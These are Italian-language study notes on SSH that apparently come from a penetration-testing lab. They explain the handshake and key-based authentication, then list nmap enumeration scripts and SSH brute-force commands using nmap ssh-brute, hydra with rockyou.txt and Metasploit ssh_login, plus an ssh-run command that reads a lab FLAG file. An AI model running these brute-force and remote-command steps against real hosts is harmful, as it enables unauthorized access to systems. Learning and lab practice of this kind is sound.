Secure Socket Shell (SSH) consente a due computer di stabilire una connessione crittografata e diretta all'interno di una rete eventualmente non sicura sulla porta standard TCP 22. 
Ciò è necessario per evitare che terzi possano intercettare il flusso di dati e quindi intercettare dati sensibili. Il server SSH può anche essere configurato per consentire solo connessioni da client specifici. Un vantaggio di SSH è che il protocollo funziona su tutti i comuni sistemi operativi. 
SSH-2 (versione sicura), SSH-1 (versione insicura) soggetta a MITM attacchi.

#### Handshake SSH
L’**handshake SSH** e lo scambio di chiavi sono fondamentali per stabilire una connessione sicura tra un client e un server tramite **SSH** (Secure Socket Shell). Ecco come funzionano:

1. **Handshake SSH**:
    - L’handshake è la fase iniziale della connessione SSH. 
        Durante l’handshake, client e server stabiliscono i parametri crittografici e le chiavi necessarie per proteggere le successive comunicazioni.
         Questi parametri includono gli algoritmi di crittografia, metodi di autenticazione ed altre informazioni necessarie per garantire la sicurezza della connessione.
2. **Scambio di chiavi**:
    - L’autenticazione tramite chiavi SSH è un metodo più sicuro rispetto alla tradizionale autenticazione con username e password.
    - Ecco come funziona:
        - **Generazione delle chiavi**:
            - L’utente genera una coppia di chiavi: una chiave pubblica e una chiave privata.
            - La chiave pubblica viene salvata sul server remoto, mentre la chiave privata rimane sul computer locale dell’utente.
        - **Invio della chiave pubblica al server**:
            - L’utente invia la sua chiave pubblica al server.
            - Il server la salva in un file speciale (ad esempio `~/.ssh/authorized_keys`).
        - **Autenticazione**:
            - Quando l’utente si connette al server, il server richiede l’autenticazione.
            - L’utente utilizza la sua chiave privata per firmare una sfida inviata dal server.
            - Se la firma corrisponde alla chiave pubblica memorizzata, l’utente viene autenticato e può accedere al server senza inserire una password
3. **Configurazione delle chiavi SSH**:
    - Per configurare le chiavi SSH:
        - Su sistemi Unix, utilizza il comando `ssh-keygen` per generare una coppia di chiavi (ad esempio: `ssh-keygen -t rsa -b 4096`).
        - Specifica il tipo di crittografia (RSA) e la lunghezza della chiave (4096 bit).
        - Salva la chiave privata in un file sicuro e definisci una passphrase per proteggerla.
        - Invia la chiave pubblica al server remoto.



##### ssh nmap scripts
```
ALL ssh scripts:
> find /usr/share/nmap/scripts -type f -name *ssh* 2>/dev/null

> nmap -p22 -sV -sC -O 192.8.3.3

Enum Algo ssh:
> nmap --script ssh2-enum-algos 192.8.3.3
  
ssh hostkey script:
> nmap --script ssh-hostkey --script-args ssh_hostkey=full 192.8.3.3

SSH check authentication used by specific Users
> nmap -p22 --script ssh-auth-methods --script-args="ssh.user=student" 192.8.3.3

Nmap dictionary attack (default nmap used /usr/share/nmap/nselib/data/passwords.lst):
> nmap -p22 --script=ssh-brute --script-args userdb=/root/users 192.230.83.3

SSH Execute command via Nmap scripts:
nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student,ssh-run.password=" 192.201.39.3
```


##### ssh login
```
> ssh student@192.8.3.3
> ssh -i ~/.ssh/private_keys root@192.168.1.1

Banner grabbing:
> nc 192.8.3.3 22 - Banner grabbing

Banner grabbing - preLogin
> ssh root@192.168.0.1 22

Dictionary attack:
> hydra -l student -P /usr/share/wordlists/rockyou.txt 192.230.83.3 ssh

Metasploit:
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.230.83.3
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit

```